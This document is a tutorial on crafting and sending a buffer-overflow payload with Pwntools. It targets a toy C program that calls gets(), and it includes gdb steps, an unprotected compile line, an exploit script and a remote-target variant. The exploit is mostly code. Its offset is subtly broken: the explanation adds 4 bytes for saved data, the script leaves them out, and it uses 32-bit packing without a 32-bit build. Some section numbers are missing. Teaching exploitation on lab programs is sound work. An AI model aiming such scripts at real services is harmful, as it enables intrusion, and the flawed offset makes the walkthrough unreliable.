## **Guide to Using Pwntools for Crafting and Sending Payloads in Buffer Overflow Exploits**
How to use **Pwntools** to automate and send payloads for buffer overflow exploits. 

### **Example Vulnerable Program (vulnerable_program.c)**

```c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("You've triggered the secret function!\n");
}

void vulnerable_function() {
    char buffer[64];
    printf("Enter a string: ");
    gets(buffer);  // Vulnerable to buffer overflow
}

int main() {
    vulnerable_function();
    return 0;
}
```
In this example, the `gets()` function does not check for the buffer size, which allows us to overflow the `buffer` array and overwrite the return address of `vulnerable_function()` to point to the `secret_function()`.

### **3. Analyzing the Vulnerability**
Before crafting a payload, it's essential to understand:
- The buffer size (`64` bytes in this case)
- The location of the return address on the stack
- The address of the function we want to redirect execution to (in this case, `secret_function`)

To find the memory address of `secret_function`, we can use tools like `gdb`.
#### **Finding the Address of the Target Function**
Start by compiling the program with debugging symbols:
```bash
gcc -g -fno-stack-protector -z execstack vulnerable_program.c -o vulnerable_program
```

Then, in GDB, find the address of `secret_function`:
```bash
gdb vulnerable_program
(gdb) disas secret_function
```

This will give you an address, for example: `0x080484b6`.

### **4. Crafting the Payload**
The goal of the payload is to:
- Overflow the buffer
- Overwrite the saved return address to point to the `secret_function`'s address

**Steps**:
1. **Fill the buffer** with 64 bytes (the size of `buffer` in the vulnerable function).
2. **Overwrite the return address** with the address of `secret_function`.

We need to calculate the offset to the return address and pad our payload accordingly.

**Payload Breakdown**:
- **64 bytes** to fill the buffer
- **4 bytes** for the saved return address
- **Address of `secret_function`**: `0x080484b6` (example)

### **5. Pwntools Script to Craft and Send the Payload**

```python
from pwn import *

# Set up the process (local)
p = process('./vulnerable_program')

# Address of secret_function (from gdb or objdump)
secret_function_address = p32(0x080484b6)  # Replace with actual address

# Payload: 64 bytes to overflow the buffer + address of secret_function
payload = b"A" * 64 + secret_function_address

# Interact with the process
p.recvuntil("Enter a string: ")  # Wait for the prompt
p.sendline(payload)  # Send the payload

# Receive the output (i.e., the result of triggering the secret function)
output = p.recvall()
print(output.decode())  # Print the output
```
- `process('./vulnerable_program')`: Runs the vulnerable program locally.
- `p32(0x080484b6)`: Converts the address of `secret_function` into a 4-byte representation (little-endian format). This is necessary because the return address is stored in little-endian format on most systems.
- `payload = b"A" * 64 + secret_function_address`: This payload first overflows the buffer with 64 bytes of "A"s, then overwrites the return address with the address of `secret_function`.
- `p.recvuntil("Enter a string: ")`: Waits for the program to prompt for input.
- `p.sendline(payload)`: Sends the payload to the program.
- `p.recvall()`: Reads all output from the program, which will include the result of executing `secret_function` (i.e., the message "You've triggered the secret function!").

### **7. Running the Exploit**

Run the script:
```bash
python exploit.py
```

You should see output indicating that the secret function was triggered, such as:
```
You've triggered the secret function!
```

### **8. Sending Input via `scanf` or `fgets`**

If the vulnerable program uses functions like `scanf()` or `fgets()` to read input, you can adapt your payload to match the format expected by these functions.

For example, if the program expects multiple inputs, you might need to provide additional values in your payload to satisfy the input format.

```python
# Example for fgets() with buffer size of 64
payload = b"A" * 64 + secret_function_address
p.sendline(payload)  # Send the payload
```

### **9. Remote Exploit (If Target Is Remote)**

If the target is remote, you can use `remote()` instead of `process()`:
```python
# Connect to the remote service
p = remote('target_ip', target_port)

# Send payload as before
p.sendline(payload)

# Receive output
output = p.recvall()
print(output.decode())
```

### **10. Conclusion**

- **Buffer Overflow Exploits**: Buffer overflows allow attackers to overwrite memory regions, including return addresses, to redirect program execution.
- **Pwntools**: Pwntools simplifies the task of automating buffer overflow exploits by providing convenient functions to interact with processes and send payloads.
- **Reverse Engineering**: The key to successful exploitation often lies in understanding the target program’s memory layout and finding the correct return addresses and buffer sizes.

### **Key Points to Remember**
- **Addresses**: Make sure you’re using the correct memory addresses (e.g., target function address).
- **Offsets**: Ensure the payload is correctly padded to match the buffer size and the location of the return address.
- **Environment**: You might need to disable protections like ASLR or stack canaries to successfully exploit buffer overflows.
